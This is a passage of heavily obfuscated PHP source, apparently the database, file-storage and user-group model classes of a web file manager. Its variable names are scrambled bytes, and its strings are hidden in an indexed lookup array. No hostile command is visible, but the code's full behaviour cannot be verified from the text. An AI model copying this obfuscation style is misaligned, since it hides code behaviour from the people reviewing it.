getFields($¨ßº£Üı) { $·Åãñ°¡ =& $_SERVER[ÏÒ Ì„]; $Å©Å×Öú = $this->query($·Åãñ°¡[894] . $this->parseKey($¨ßº£Üı)); $ÜÑ‹À² = array(); if ($Å©Å×Öú) { foreach ($Å©Å×Öú as $ùõÉ—ƒì => $óé²ñ³Ç) { $ÜÑ‹À²[$óé²ñ³Ç[$·Åãñ°¡[27]]] = array($·Åãñ°¡[28] => $óé²ñ³Ç[$·Åãñ°¡[27]], $·Åãñ°¡[29] => $óé²ñ³Ç[$·Åãñ°¡[30]], $·Åãñ°¡[31] => (bool) ($óé²ñ³Ç[$·Åãñ°¡[32]] === $·Åãñ°¡[33]), $·Åãñ°¡[34] => $óé²ñ³Ç[$·Åãñ°¡[35]], $·Åãñ°¡[36] => strtolower($óé²ñ³Ç[$·Åãñ°¡[37]]) == $·Åãñ°¡[38], $·Åãñ°¡[39] => strtolower($óé²ñ³Ç[$·Åãñ°¡[40]]) == $·Åãñ°¡[41]); } } return $ÜÑ‹À²; } public function getTables($¾Œ¾ü’– = '') { $¥ÔÍë™Â =& $_SERVER[ÏÒ Ì„]; $¡Ø¤È„ç = !empty($¾Œ¾ü’–) ? $¥ÔÍë™Â[896] . $¾Œ¾ü’– . $¥ÔÍë™Â[897] : $¥ÔÍë™Â[898]; $ğß‘½ì™ = $this->query($¡Ø¤È„ç); $äİ™¦÷Â = array(); if ($ğß‘½ì™) { foreach ($ğß‘½ì™ as $²¸åÓ´‘ => $¦ı‘»±”) { $äİ™¦÷Â[$²¸åÓ´‘] = current($¦ı‘»±”); } } return $äİ™¦÷Â; } public function replace($¢¾ÁÏ“Œ, $©¹±·‘¨ = array()) { $şÑ˜–¨ =& $_SERVER[ÏÒ Ì„]; foreach ($¢¾ÁÏ“Œ as $–ÓòîØ => $©³©òÆ€) { $ºª ¼©¢ = $this->parseValue($©³©òÆ€); if (is_scalar($ºª ¼©¢)) { $ª¦Í•ÜÄ[] = $ºª ¼©¢; $Õîäõ‘[] = $this->parseKey($–ÓòîØ); } } $«Âğ„óã = $şÑ˜–¨[899] . $this->parseTable($©¹±·‘¨[$şÑ˜–¨[277]]) . $şÑ˜–¨[900] . implode($şÑ˜–¨[47], $Õîäõ‘) . $şÑ˜–¨[901] . implode($şÑ˜–¨[47], $ª¦Í•ÜÄ) . $şÑ˜–¨[902]; return $this->execute($«Âğ„óã); } public function insertAll($Ö±Õõ¼, $¿¹à„¿Ö = array(), $îü½†‚Š = false) { $ÚŞˆ˜ÁÍ =& $_SERVER[ÏÒ Ì„]; if (!is_array($Ö±Õõ¼[0])) { return !1; } $´º¯Ä¾ = array_keys($Ö±Õõ¼[0]); $î½ÒñœÃ = array(); foreach ($Ö±Õõ¼ as $‚µÙÉş) { $ÅãÏİ¤ = array(); foreach ($‚µÙÉş as $ŞƒÆô‡ => $’¿„¯°») { $’¿„¯°» = $this->parseValue($’¿„¯°»); if (is_scalar($’¿„¯°»)) { $ÅãÏİ¤[] = $’¿„¯°»; } } $î½ÒñœÃ[] = $ÚŞˆ˜ÁÍ[258] . implode($ÚŞˆ˜ÁÍ[47], $ÅãÏİ¤) . $ÚŞˆ˜ÁÍ[902]; } array_walk($´º¯Ä¾, array($this, $ÚŞˆ˜ÁÍ[903])); $´¡¸¸»• = $îü½†‚Š ? $ÚŞˆ˜ÁÍ[904] : $ÚŞˆ˜ÁÍ[905]; $‰–“³Ñä = $´¡¸¸»• . $ÚŞˆ˜ÁÍ[906] . $this->parseTable($¿¹à„¿Ö[$ÚŞˆ˜ÁÍ[277]]) . $ÚŞˆ˜ÁÍ[900] . implode($ÚŞˆ˜ÁÍ[47], $´º¯Ä¾) . $ÚŞˆ˜ÁÍ[907] . implode($ÚŞˆ˜ÁÍ[47], $î½ÒñœÃ); return $this->execute($‰–“³Ñä); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $÷÷¦ëà÷ =& $_SERVER[ÏÒ Ì„]; $this->error = $this->_linkID->errno . $÷÷¦ëà÷[4] . $this->_linkID->error; if ($÷÷¦ëà÷[33] != $this->queryStr) { $this->error .= LNG($÷÷¦ëà÷[45]) . $this->queryStr; } think_trace($this->error, $÷÷¦ëà÷[33], $÷÷¦ëà÷[46]); return $this->error; } public function escapeString($ê»Èó×ó) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ê»Èó×ó); } else { return addslashes($ê»Èó×ó); } } public function parseKey(&$©Çñ×¯Œ, $´”…ìÁ¡ = true) { $Õšøô‡° =& $_SERVER[ÏÒ Ì„]; if ($´”…ìÁ¡) { $©Çñ×¯Œ = $this->parseKeyCheck($©Çñ×¯Œ); } if ($©Çñ×¯Œ != $Õšøô‡°[182] && !preg_match($Õšøô‡°[908], $©Çñ×¯Œ)) { $©Çñ×¯Œ = $Õšøô‡°[383] . trim($©Çñ×¯Œ, $Õšøô‡°[383]) . $Õšøô‡°[383]; } return $©Çñ×¯Œ; } } goto bĞñ¦à…ø; c²÷öÕÇ¶Ğ: class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\x6c\145\137\x63\157\156\x74\145\x6e\164\x73"; protected $dataAuto = array(array("\x63\162\145\x61\164\x65\x54\151\x6d\145", "\164\151\155\145", "\151\156\163\x65\x72\164", "\146\x75\156\143\164\151\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\x69\154\x65"; protected $tableMeta = array("\x74\x61\142\154\145\116\x61\155\x65" => "\151\x6f\137\146\x69\154\x65\x5f\155\x65\x74\x61", "\155\x65\164\x61\106\x69\x65\154\x64" => "\146\x69\154\145\x49\104"); public function fileInfo($‡ş–Æ€°) { $æÌ•ÂÖ =& $_SERVER[ÏÒ Ì„]; static $Ã›»•‚¦ = array(); if (!isset($Ã›»•‚¦[$‡ş–Æ€°])) { $°¥»ù°œ = $æÌ•ÂÖ[1794]; $£Õ­­Ñú = Model($æÌ•ÂÖ[464])->field($°¥»ù°œ)->where(array($æÌ•ÂÖ[462] => $‡ş–Æ€°))->find(); $Ã›»•‚¦[$‡ş–Æ€°] = $£Õ­­Ñú; } return $Ã›»•‚¦[$‡ş–Æ€°]; } public function addFileByContent($»éäŒ¼¤ = '', $ÔØÓÙêù = '') { $ø€¼è¢Ô =& $_SERVER[ÏÒ Ì„]; $˜„òÏ¢Õ = TEMP_PATH . $ø€¼è¢Ô[1795]; if (!is_dir($˜„òÏ¢Õ)) { mk_dir($˜„òÏ¢Õ); } $å‰ã’™Ø = $˜„òÏ¢Õ . $ø€¼è¢Ô[1796] . rand_string(16); file_put_contents($å‰ã’™Ø, $»éäŒ¼¤); $ıÅûÌÕæ = $this->addFile($å‰ã’™Ø, $ÔØÓÙêù, !0); if (file_exists($å‰ã’™Ø)) { @unlink($å‰ã’™Ø); } return $ıÅûÌÕæ; } public function createFileName($‘úªİ¾, $ã¬ĞŠ¨Ù = false, $ˆªÆ = false) { $°»ä·Ïå =& $_SERVER[ÏÒ Ì„]; $¹§¸á  = IO::init($°»ä·Ïå[8]); $«ìßÃúø = $this->makeFilePath($‘úªİ¾, $¹§¸á , $ã¬ĞŠ¨Ù, $ˆªÆ); $ıÜà½÷Ğ = $¹§¸á ->pathFather($«ìßÃúø); static $ó¹Úı’ = false; $¬Ï‡…ğ = $°»ä·Ïå[1797] . md5($ıÜà½÷Ğ); if (!$ó¹Úı’ && !Cache::get($¬Ï‡…ğ)) { $ó¹Úı’ = !0; $ïÆ’‘¸ù = IO::mkdir($ıÜà½÷Ğ); if (!IO::exist($ïÆ’‘¸ù . $°»ä·Ïå[793])) { IO::mkfile($ïÆ’‘¸ù . $°»ä·Ïå[793]); } Cache::set($¬Ï‡…ğ, 1, 3600 * 2); } return $«ìßÃúø; } public function makeFilePath($öš¼£—„, $÷ø–¥–ğ, $úœÍö‰ = false, $’Ö»ÂÀ™ = false) { $¡Ö¿¼å =& $_SERVER[ÏÒ Ì„]; $²´¥¢Õ = Model($¡Ö¿¼å[760])->get($¡Ö¿¼å[1798]); $£÷¥å÷… = KodIO::defaultIO() . date($¡Ö¿¼å[1799]); $áµô°µ¹ = $£÷¥å÷… . rand_string(5) . short_id(100); $öš¼£—„ = str_replace($¡Ö¿¼å[8], $¡Ö¿¼å[71], KodIO::clear($öš¼£—„)); $ë»ÁŠÂ“ = $÷ø–¥–ğ->ext($öš¼£—„); if (!$öš¼£—„) { $²´¥¢Õ = $¡Ö¿¼å[1800]; } switch ($²´¥¢Õ) { case $¡Ö¿¼å[1801]: $áµô°µ¹ = $áµô°µ¹ . $¡Ö¿¼å[95] . $÷ø–¥–ğ->ext($öš¼£—„); if ($ë»ÁŠÂ“ == $¡Ö¿¼å[1738]) { $áµô°µ¹ .= $¡Ö¿¼å[1474]; } break; case $¡Ö¿¼å[1802]: $Ïö§ãÖ = Model($¡Ö¿¼å[760])->get($¡Ö¿¼å[761]); $õ˜£‘›¨ = substr(md5($¡Ö¿¼å[762] . $Ïö§ãÖ . date($¡Ö¿¼å[738])), 0, 8); $Â”­ ·‰ = KodIO::defaultDriver(); $£÷¥å÷… = $¡Ö¿¼å[1157] . $Â”­ ·‰[$¡Ö¿¼å[395]] . $¡Ö¿¼å[404] . date($¡Ö¿¼å[1803]) . $õ˜£‘›¨ . $¡Ö¿¼å[8]; if ($ë»ÁŠÂ“ == $¡Ö¿¼å[1738]) { $öš¼£—„ .= $¡Ö¿¼å[1474]; } $ÎÒùÑæ” = $¡Ö¿¼å[1804] . $£÷¥å÷… . $öš¼£—„; CacheLock::lock($ÎÒùÑæ”); $áµô°µ¹ = $£÷¥å÷… . $öš¼£—„; if (IO::exist($£÷¥å÷… . $öš¼£—„)) { $¿ûÉºÅó = substr($öš¼£—„, 0, strlen($öš¼£—„) - strlen($ë»ÁŠÂ“)); $ˆæÕÛ…Ç = $’Ö»ÂÀ™ ? substr($’Ö»ÂÀ™, 0, 5) : ($úœÍö‰ ? substr($úœÍö‰, 0, 5) : rand_string(5)); $áµô°µ¹ = $£÷¥å÷… . $¿ûÉºÅó . $ˆæÕÛ…Ç . $¡Ö¿¼å[95] . $ë»ÁŠÂ“; } if (IO::isTypeObject($áµô°µ¹) && !IO::isUploadServer($áµô°µ¹)) { if (IO::exist($áµô°µ¹)) { return $áµô°µ¹; } $á·ÍæŞ• = IO::setContent($áµô°µ¹, $¡Ö¿¼å[33]); if (!$á·ÍæŞ•) { show_json($¡Ö¿¼å[1805], !1); } } CacheLock::unlock($ÎÒùÑæ”); break; case $¡Ö¿¼å[1800]: break; default: break; } return $áµô°µ¹; } public function addFileByRemote($«ˆØ¡‰À, $Œş« ‘¯, $Êåİ¥Ô = array()) { $İÍ©‹Î¯ =& $_SERVER[ÏÒ Ì„]; if (!IO::exist($«ˆØ¡‰À)) { return !1; } $ƒ±ˆ·îÇ = $Êåİ¥Ô[$İÍ©‹Î¯[170]] ? $Êåİ¥Ô[$İÍ©‹Î¯[170]] : $İÍ©‹Î¯[33]; $ÒçˆÈÆ = IO::hashMd5($«ˆØ¡‰À, $ƒ±ˆ·îÇ); $É°®«‘ö = KodIO::defaultDriver(); $Ô’Ší¥¨ = array($İÍ©‹Î¯[573] => IO::size($«ˆØ¡‰À), $İÍ©‹Î¯[1806] => 1, $İÍ©‹Î¯[415] => $Œş« ‘¯, $İÍ©‹Î¯[805] => $É°®«‘ö[$İÍ©‹Î¯[395]], $İÍ©‹Î¯[416] => $«ˆØ¡‰À, $İÍ©‹Î¯[1807] => $Êåİ¥Ô[$İÍ©‹Î¯[171]] ? $Êåİ¥Ô[$İÍ©‹Î¯[171]] : IO::hashSimple($«ˆØ¡‰À), $İÍ©‹Î¯[1808] => $ÒçˆÈÆ ? $ÒçˆÈÆ : $ƒ±ˆ·îÇ); if ($ìÊÓ«Æó = $this->addFileCheckExist($Ô’Ší¥¨[$İÍ©‹Î¯[171]], $Ô’Ší¥¨[$İÍ©‹Î¯[170]], $Ô’Ší¥¨[$İÍ©‹Î¯[78]])) { return $ìÊÓ«Æó; } return $this->addFileData($Ô’Ší¥¨); } private function addFileData($ï­ƒîÌå) { $±îİü¸å =& $_SERVER[ÏÒ Ì„]; if (!$ï­ƒîÌå) { return !1; } $ï­ƒîÌå[$±îİü¸å[78]] = intval($ï­ƒîÌå[$±îİü¸å[78]]); if (!$ï­ƒîÌå[$±îİü¸å[78]] && strlen($ï­ƒîÌå[$±îİü¸å[171]]) > 32) { $ï­ƒîÌå[$±îİü¸å[78]] = intval(substr($ï­ƒîÌå[$±îİü¸å[171]], 32)); } $¦íäÁ˜— = $this->add($ï­ƒîÌå); return $this->find($¦íäÁ˜—); } public function addFile($ŞÚå‹‰Ì, $Ä×ßş×®, $¨Ÿá¤Î­ = false) { $ùõ™õŞ =& $_SERVER[ÏÒ Ì„]; $¿®Ú = IO::hashSimple($ŞÚå‹‰Ì); $À·Òß˜™ = IO::size($ŞÚå‹‰Ì); $ïÙÈ¼— = $À·Òß˜™ <= 1024 * 1024 * 10 ? IO::hashMd5($ŞÚå‹‰Ì) : $ùõ™õŞ[33]; $ø³½öªƒ = $ùõ™õŞ[1809] . $¿®Ú; CacheLock::lock($ø³½öªƒ); if ($ïÙÈ¼— && $¿®Ú) { $Í’æı = $this->addFileCheckExist($¿®Ú, $ïÙÈ¼—, $À·Òß˜™); if ($Í’æı) { CacheLock::unlock($ø³½öªƒ); return $Í’æı; } } $Ù¶ëå× = $this->addFileMake($ŞÚå‹‰Ì, $À·Òß˜™, $¿®Ú, $ïÙÈ¼—, $Ä×ßş×®, $¨Ÿá¤Î­); $“ÀÅ½«è = $this->addFileData($Ù¶ëå×); CacheLock::unlock($ø³½öªƒ); if (!$ïÙÈ¼— && $“ÀÅ½«è) { $this->fileMd5Check($“ÀÅ½«è); } return $“ÀÅ½«è; } private function fileMd5Check($˜Ş¿İ‚ı) { $½à¬§ç» =& $_SERVER[ÏÒ Ì„]; $„åéÁ…• = array($˜Ş¿İ‚ı[$½à¬§ç»[461]], $˜Ş¿İ‚ı[$½à¬§ç»[76]]); $ğóšƒæ¿ = $½à¬§ç»[1810] . $˜Ş¿İ‚ı[$½à¬§ç»[76]]; $Ì¼‡¥Ö¼ = $½à¬§ç»[1811] . $˜Ş¿İ‚ı[$½à¬§ç»[461]]; $ßúÊ†Ç = TaskQueue::add($½à¬§ç»[1812], $„åéÁ…•, $ğóšƒæ¿, $Ì¼‡¥Ö¼); if (!$ßúÊ†Ç) { $this->fileMd5Set($˜Ş¿İ‚ı[$½à¬§ç»[461]], $˜Ş¿İ‚ı[$½à¬§ç»[76]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($òå¦ò¼, $¢Ï•à) { $ÀïøüÔ =& $_SERVER[ÏÒ Ì„]; $Ò³ªÁû™ = $this->find($òå¦ò¼); if (!$Ò³ªÁû™ || $Ò³ªÁû™[$ÀïøüÔ[170]]) { return; } $•–ÍÚÚÙ = IO::hashMd5($¢Ï•à); if (!$•–ÍÚÚÙ) { return $ÀïøüÔ[33]; } $this->where(array($ÀïøüÔ[461] => $òå¦ò¼))->save(array($ÀïøüÔ[170] => $•–ÍÚÚÙ)); } public function addFileMake($‡ª‡‡“â, $í¢˜„Ì, $Ş¤¢àš, $€òÚ‹á¢, $ã ˜ŠŸÆ, $ˆ¤¢Ö) { $‰òğ°…â =& $_SERVER[ÏÒ Ì„]; $³Ëı–¶ = $this->createFileName($ã ˜ŠŸÆ, $Ş¤¢àš, $€òÚ‹á¢); $Ã³Ù¿¨  = get_path_father($³Ëı–¶); $ÕÙ’ä»‘ = get_path_this($³Ëı–¶); if ($ˆ¤¢Ö) { $Ğ©ñÊ¥ = IO::move($‡ª‡‡“â, $Ã³Ù¿¨ , !1, $ÕÙ’ä»‘); } else { $Ğ©ñÊ¥ = IO::copy($‡ª‡‡“â, $Ã³Ù¿¨ , !1, $ÕÙ’ä»‘); } if (!$Ğ©ñÊ¥) { return !1; } $áŞû€Ù = KodIO::defaultDriver(); $àŞ² ª¥ = array($‰òğ°…â[573] => $í¢˜„Ì, $‰òğ°…â[1806] => 1, $‰òğ°…â[415] => $ã ˜ŠŸÆ, $‰òğ°…â[805] => $áŞû€Ù[$‰òğ°…â[395]], $‰òğ°…â[416] => $³Ëı–¶, $‰òğ°…â[1807] => $Ş¤¢àš, $‰òğ°…â[1808] => $€òÚ‹á¢); return $àŞ² ª¥; } public function addFileCheckExist($‚Óƒ‡ı‡, $Õ„‚«—ä, $ÂÔÎ’¢É) { $‘ñÁµö¯ =& $_SERVER[ÏÒ Ì„]; $Ø¥úî„ = $this->findByHash($‚Óƒ‡ı‡, $Õ„‚«—ä); if (!$Ø¥úî„) { return !1; } $Ó€ÕØ¢¯ = array($‘ñÁµö¯[1806] => intval($Ø¥úî„[$‘ñÁµö¯[1813]]) + 1, $‘ñÁµö¯[573] => $ÂÔÎ’¢É); $this->where(array($‘ñÁµö¯[462] => $Ø¥úî„[$‘ñÁµö¯[461]]))->save($Ó€ÕØ¢¯); return $Ø¥úî„; } public function remove($î›¶ˆÕá) { $this->linkCountChange($î›¶ˆÕá, !1); $this->clearEmpty(); return !0; } public function linkAdd($ûŞØÂ»‚) { $this->linkCountChange($ûŞØÂ»‚, !0); } public function linkCountChange($ûêëç¨ş, $µˆ¼¦ë) { $¿’•ÄÈ =& $_SERVER[ÏÒ Ì„]; if (!$ûêëç¨ş) { return; } if (!is_array($ûêëç¨ş)) { $ûêëç¨ş = array($ûêëç¨ş); } $¯“¤û¶Å = array(); foreach ($ûêëç¨ş as $¼¤şµşå) { $³Õí“§ = $¼¤şµşå . $¿’•ÄÈ[33]; if (!$¯“¤û¶Å[$³Õí“§]) { $¯“¤û¶Å[$³Õí“§] = 0; } $¯“¤û¶Å[$³Õí“§]++; } $„ºøÑìÍ = array(); foreach ($¯“¤û¶Å as $¼¤şµşå => $É™ø‹ğŞ) { $³Õí“§ = $É™ø‹ğŞ . $¿’•ÄÈ[33]; if (!$„ºøÑìÍ[$³Õí“§]) { $„ºøÑìÍ[$³Õí“§] = array(); } $„ºøÑìÍ[$³Õí“§][] = $¼¤şµşå; } foreach ($„ºøÑìÍ as $É™ø‹ğŞ => $†¶ûŸ¬˜) { if (!$†¶ûŸ¬˜) { continue; } $É™ø‹ğŞ = $µˆ¼¦ë ? $É™ø‹ğŞ : -intval($É™ø‹ğŞ); $ùÎ¸–ô¨ = array($¿’•ÄÈ[461] => array($¿’•ÄÈ[7], $†¶ûŸ¬˜)); if ($É™ø‹ğŞ < 0) { $ùÎ¸–ô¨[$¿’•ÄÈ[1813]] = array($¿’•ÄÈ[1009], abs($É™ø‹ğŞ)); } $this->where($ùÎ¸–ô¨)->setAdd($¿’•ÄÈ[1813], $É™ø‹ğŞ); } } public function findByHash($úå•ª—í, $Éª¢ù”¼ = false) { $ıî¥‹î =& $_SERVER[ÏÒ Ì„]; if (!$úå•ª—í && !$Éª¢ù”¼) { return !1; } $¬Æ›õó = array($ıî¥‹î[1807] => $úå•ª—í); if ($Éª¢ù”¼) { $¬Æ›õó = array($ıî¥‹î[1808] => $Éª¢ù”¼); } return $this->order($ıî¥‹î[1814])->where($¬Æ›õó)->find(); } public function clearEmpty($’ı±ÑÏ± = 0) { $¾€ü¬›ô =& $_SERVER[ÏÒ Ì„]; $¶Ìä£É = time() - 3600 * 24 * $’ı±ÑÏ±; $áÃÇŞÆ³ = $¾€ü¬›ô[1815] . $¶Ìä£É; $Ã×Šåçƒ = $this->where($áÃÇŞÆ³)->select(); if (!$Ã×Šåçƒ) { return; } $«´¾„° = new Task($¾€ü¬›ô[1816], $¾€ü¬›ô[33], count($Ã×Šåçƒ)); foreach ($Ã×Šåçƒ as $¤áÜßéˆ) { $«´¾„°->update(1); $this->resetFile($¤áÜßéˆ); } $«´¾„°->end(); } public function resetFile($ı«î‡ÈÁ) { $æ€«ºÜ =& $_SERVER[ÏÒ Ì„]; $ÌËœÜáÈ = array($æ€«ºÜ[462] => $ı«î‡ÈÁ[$æ€«ºÜ[461]]); $Óº¨öÏÚ = Model($æ€«ºÜ[1251])->where($ÌËœÜáÈ)->count(); $óüŠé¤İ = Model($æ€«ºÜ[1817])->where($ÌËœÜáÈ)->count(); $ş¾ØÄ¦¨ = intval($Óº¨öÏÚ) + intval($óüŠé¤İ); if ($ş¾ØÄ¦¨ == 0) { IO::remove($ı«î‡ÈÁ[$æ€«ºÜ[76]]); Model($æ€«ºÜ[1818])->delete($ı«î‡ÈÁ[$æ€«ºÜ[461]]); $this->where($ÌËœÜáÈ)->delete(); $this->metaSet($ı«î‡ÈÁ[$æ€«ºÜ[461]], null, null); return; } if ($ı«î‡ÈÁ[$æ€«ºÜ[1813]] != $ş¾ØÄ¦¨) { $this->where($ÌËœÜáÈ)->save(array($æ€«ºÜ[1806] => $ş¾ØÄ¦¨)); } } public function storageInfo($µ²òªªÓ = false) { $úÊÑ’Ğ… =& $_SERVER[ÏÒ Ì„]; $Ú‰º•€ = $this->count() + 0.0; $‡Ç÷Ç» = 0; $ªÙØ™ = 1; $Õş¬ÔÏè = 0; $Æü’²ì¡ = 5000; for ($§·È´Í = 0; $§·È´Í < $Ú‰º•€; $§·È´Í = $§·È´Í + $Æü’²ì¡) { $¯”éÏäè = $this->limit($§·È´Í, $§·È´Í + $Æü’²ì¡)->select(); foreach ($¯”éÏäè as $ó½Îë‰) { $ªÙØ™ += $ó½Îë‰[$úÊÑ’Ğ…[78]] * $ó½Îë‰[$úÊÑ’Ğ…[1813]]; $‡Ç÷Ç» += $ó½Îë‰[$úÊÑ’Ğ…[78]] * ($ó½Îë‰[$úÊÑ’Ğ…[1813]] - 1); $Õş¬ÔÏè += $ó½Îë‰[$úÊÑ’Ğ…[1813]]; } } $‡øçŸÄŞ = array($úÊÑ’Ğ…[1819] => $ªÙØ™, $úÊÑ’Ğ…[1820] => $‡Ç÷Ç», $úÊÑ’Ğ…[1821] => $‡Ç÷Ç» / $ªÙØ™, $úÊÑ’Ğ…[82] => $Ú‰º•€, $úÊÑ’Ğ…[1822] => $Õş¬ÔÏè); return $‡øçŸÄŞ; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\165\x70"; protected $tableMeta = array("\164\x61\142\154\x65\116\x61\x6d\145" => "\x67\162\x6f\165\160\x5f\155\x65\164\141", "\x6d\145\x74\x61\106\x69\145\x6c\x64" => "\x67\x72\x6f\x75\x70\x49\104"); protected function cacheFunctionAlias($›ÜÊ‡šÁ) { $­Ó·ÍÇó =& $_SERVER[ÏÒ Ì„]; return array($­Ó·ÍÇó[1823] => array($›ÜÊ‡šÁ[0], $­Ó·ÍÇó[1824]), $­Ó·ÍÇó[1825] => array($›ÜÊ‡šÁ[0], $­Ó·ÍÇó[1826])); } protected function getInfo($†øâ¿ê, $ããŠ…ÚÚ = false) { $Ÿµôˆã = $this->getInfoSimple($†øâ¿ê); if (!$Ÿµôˆã) { return !1; } if ($ããŠ…ÚÚ) { return $this->_listDataApplyItem($Ÿµôˆã); } return $this->cacheFunctionGet($_SERVER[ÏÒ Ì„][1827], $†øâ¿ê); } protected function getInfoSimple($ìÜ³ûœ§, $şğ ½¡ = false) { $ë¸ª´¡Í =& $_SERVER[ÏÒ Ì„]; if ($şğ ½¡) { $†îŠÃşç = array($ë¸ª´¡Í[1746] => intval($ìÜ³ûœ§)); $åäÅ™Ï® = $this->where($†îŠÃşç)->find(); return is_array($åäÅ™Ï®) ? $åäÅ™Ï® : array(); } return $this->cacheFunctionGet($ë¸ª´¡Í[1828], $ìÜ³ûœ§); } protected function groupAdd($î˜¯°ßÄ) { $ÜèŸ²µØ =& $_SERVER[ÏÒ Ì„]; if (!$î˜¯°ßÄ[$ÜèŸ²µØ[492]] && isset($î˜¯°ßÄ[$ÜèŸ²µØ[1746]]) && $î˜¯°ßÄ[$ÜèŸ²µØ[1746]] == 1) { if ($Ï¯¡´ÜÕ = $this->getInfoSimple($î˜¯°ßÄ[$ÜèŸ²µØ[1746]], !0)) { return $î˜¯°ßÄ[$ÜèŸ²µØ[1746]]; } } else { $Ï¯¡´ÜÕ = $this->getInfoSimple($î˜¯°ßÄ[$ÜèŸ²µØ[492]]); if (!$Ï¯¡´ÜÕ) { return !1; } } $”²§õ÷ = $ÜèŸ²µØ[525]; if ($Ï¯¡´ÜÕ[$ÜèŸ²µØ[515]]) { $”²§õ÷ = $Ï¯¡´ÜÕ[$ÜèŸ²µØ[515]] . $Ï¯¡´ÜÕ[$ÜèŸ²µØ[1746]] . $ÜèŸ²µØ[47]; } $„‘ÛŞˆæ = array($ÜèŸ²µØ[415] => $this->groupNameAuto($î˜¯°ßÄ[$ÜèŸ²µØ[492]], $î˜¯°ßÄ[$ÜèŸ²µØ[28]]), $ÜèŸ²µØ[396] => $î˜¯°ßÄ[$ÜèŸ²µØ[492]], $ÜèŸ²µØ[578] => $”²§õ÷, $ÜèŸ²µØ[1829] => $î˜¯°ßÄ[$ÜèŸ²µØ[1732]], $ÜèŸ²µØ[1830] => 0, $ÜèŸ²µØ[1750] => 0); if (isset($î˜¯°ßÄ[$ÜèŸ²µØ[1769]])) { $„‘ÛŞˆæ[$ÜèŸ²µØ[1769]] = $î˜¯°ßÄ[$ÜèŸ²µØ[1769]]; } else { $úÔ¾®¯ = $this->max($ÜèŸ²µØ[1769]); if (!$úÔ¾®¯) { $úÔ¾®¯ = 0; } $„‘ÛŞˆæ[$ÜèŸ²µØ[1769]] = $úÔ¾®¯ + 1; } if (!empty($î˜¯°ßÄ[$ÜèŸ²µØ[1746]])) { $„‘ÛŞˆæ[$ÜèŸ²µØ[1746]] = $î˜¯°ßÄ[$ÜèŸ²µØ[1746]]; } $î×§¼ù¥ = $this->add($„‘ÛŞˆæ); $this->setNamePinyin($î×§¼ù¥, $„‘ÛŞˆæ[$ÜèŸ²µØ[28]]); if (isset($î˜¯°ßÄ[$ÜèŸ²µØ[1831]])) { $this->metaSet($î×§¼ù¥, array($ÜèŸ²µØ[1831] => $î˜¯°ßÄ[$ÜèŸ²µØ[1831]], $ÜèŸ²µØ[1832] => $î˜¯°ßÄ[$ÜèŸ²µØ[1832]])); unset($î˜¯°ßÄ[$ÜèŸ²µØ[1831]]); unset($î˜¯°ßÄ[$ÜèŸ²µØ[1832]]); } Model($ÜèŸ²µØ[1251])->groupRootAdd($î×§¼ù¥); return $î×§¼ù¥; } protected function groupEdit($¶ñşËƒì, $ƒ’”ˆ»ì) { $ÒÂÛ ô½ =& $_SERVER[ÏÒ Ì„]; $•¯Şú× = $this->getInfoSimple($¶ñşËƒì); if (!$•¯Şú×) { return !1; } if (!empty($ƒ’”ˆ»ì[$ÒÂÛ ô½[492]])) { $ÇÅùàÀ· = $this->getInfoSimple($ƒ’”ˆ»ì[$ÒÂÛ ô½[492]]); if (!$ÇÅùàÀ·) { return !1; } if ($•¯Şú×[$ÒÂÛ ô½[1746]] == $ÇÅùàÀ·[$ÒÂÛ ô½[1746]]) { return !1; } if ($ƒ’”ˆ»ì[$ÒÂÛ ô½[492]] != $•¯Şú×[$ÒÂÛ ô½[492]]) { if ($ÇÅùàÀ·[$ÒÂÛ ô½[515]] !== $•¯Şú×[$ÒÂÛ ô½[515]] && strpos($ÇÅùàÀ·[$ÒÂÛ ô½[515]], $•¯Şú×[$ÒÂÛ ô½[515]] . $•¯Şú×[$ÒÂÛ ô½[1746]] . $ÒÂÛ ô½[47]) === 0) { return !1; } $ƒ’”ˆ»ì[$ÒÂÛ ô½[578]] = $ÇÅùàÀ·[$ÒÂÛ ô½[515]] . $ƒ’”ˆ»ì[$ÒÂÛ ô½[492]] . $ÒÂÛ ô½[47]; $this->_changeChildLevel($•¯Şú×, $ÇÅùàÀ·); } } if (isset($ƒ’”ˆ»ì[$ÒÂÛ ô½[28]])) { $this->setNamePinyin($¶ñşËƒì, $ƒ’”ˆ»ì[$ÒÂÛ ô½[28]]); } if (isset($ƒ’”ˆ»ì[$ÒÂÛ ô½[1831]])) { $this->metaSet($¶ñşËƒì, array($ÒÂÛ ô½[1831] => $ƒ’”ˆ»ì[$ÒÂÛ ô½[1831]], $ÒÂÛ ô½[1832] => $ƒ’”ˆ»ì[$ÒÂÛ ô½[1832]])); unset($ƒ’”ˆ»ì[$ÒÂÛ ô½[1831]]); unset($ƒ’”ˆ»ì[$ÒÂÛ ô½[1832]]); } $this->_clearChildrenCache($•¯Şú×); return $this->where(array($ÒÂÛ ô½[1833] => $¶ñşËƒì))->save($ƒ’”ˆ»ì); } private function _clearChildrenCache($¬èæ´ÈÓ) { $ò±½Š´ =& $_SERVER[ÏÒ Ì„]; $±™·í™ç = array($ò±½Š´[578] => array($ò±½Š´[538], $¬èæ´ÈÓ[$ò±½Š´[515]] . $¬èæ´ÈÓ[$ò±½Š´[1746]] . $ò±½Š´[539])); $Øù¬“å = $this->field($ò±½Š´[1746])->where($±™·í™ç)->select(); foreach ($Øù¬“å as $¸³Æ‘»¶) { $this->_clearCache($¸³Æ‘»¶[$ò±½Š´[1746]]); } } private function _clearCache($‡¦âµ´µ) { $Ü…ø¬î¥ =& $_SERVER[ÏÒ Ì„]; $this->cacheFunctionClear($Ü…ø¬î¥[1827], $‡¦âµ´µ); $this->cacheFunctionClear($Ü…ø¬î¥[1828], $‡¦âµ´µ); } private function _changeChildLevel($º¢‰±É, $ÁÓ¬Š‰ª, $¸øĞÀğœ = false) { $¢½›£à =& $_SERVER[ÏÒ Ì„]; $¬è›Şâ = $º¢‰±É[$¢½›£à[515]] . $º¢‰±É[$¢½›£à[1746]] . $¢½›£à[47]; $–ª•òöª = $ÁÓ¬Š‰ª[$¢½›£à[515]] . $ÁÓ¬Š‰ª[$¢½›£à[1746]] . $¢½›£à[47] . $º¢‰±É[$¢½›£à[1746]] . $¢½›£à[47]; if ($¸øĞÀğœ) { 